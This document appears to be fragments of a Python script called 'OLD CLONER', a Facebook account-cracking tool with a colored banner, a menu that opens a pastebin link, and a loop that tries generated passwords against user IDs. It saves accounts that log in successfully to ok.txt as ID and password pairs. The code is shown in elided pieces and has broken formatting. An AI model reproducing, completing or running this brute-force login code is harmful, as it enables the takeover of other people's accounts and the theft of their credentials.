W = '\033[97;1m'  
 ...
      [ AUTHOR   : kazi samir     
      [ Facebook   : Fourkan uddin tanvir
      [ YouTube : nai
      [ POWER BY : \x1b[1;32mkazi samir\x1b[1;97m             
    _____________________________________________________________________________________|033[1;92m""") 
                 print("%s [%s庐%s] %sTOOL NAME : %sOLD CLONER"%(G,R,G,Y,G)) 
                 print("%s [%s庐%s] %sVERSION   : %s2.0 "%(G,R,G,Y,G)) 
                 print("%s [%s庐%s] %sSTATUS    : %sF R E E"%(G,R,G,Y,G))  
                 print("\033[97;1m  ________________________________________________________________________________________") 
                 print("\033[92;1m      AUTHOR : kazi samir      ") 
                 print("\033[97;1m  ________________________________________________________________________________________") 
 ...
                                 self.oldcrack() 
                 elif hoga in ["7", "07"]: 
                         os.system('am start https://pastebin.com/raw/VPm79mat') 
                 else: 
                         Main() 
 ...
                 x = 111 
                 xx = 999 
                 nam = input("%s [?] TYPE A NAME %s(EX:kazi ", " samir ): "%(Y,G)) 
                 nam = nam.replace(" ", "") 
 ...
                 ]) 
                 sys.stdout.write( 
                         "\r\r %s\033[0;93m[SAMIR -CLONING : \033[0;97m %s/%s -> \033[0;92m [OK-ID:%s ]- \033[0;93m[CP-ID:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp)) 
                 ); sys.stdout.flush() 
                 for pw in pwx: 
                         pw = pw.lower() 
 ...
                                 print("\r \033[0;92m[SAMIR -OK-ID] %s|%s\033[0;97m         "%(uid, pw)) 
                                 self.ok.append("%s|%s"%(uid, pw)) 
                                 open("ok.txt","a").write(" OK] %s|%s\n"%(uid, pw)) 
                                 break 
                         elif "www.facebook.com" in response.json()["error_msg"]: 
                                 print("\r \033[0;93m[CP-ID] %s|%s\033[0;97m         "%(uid, pw)) 
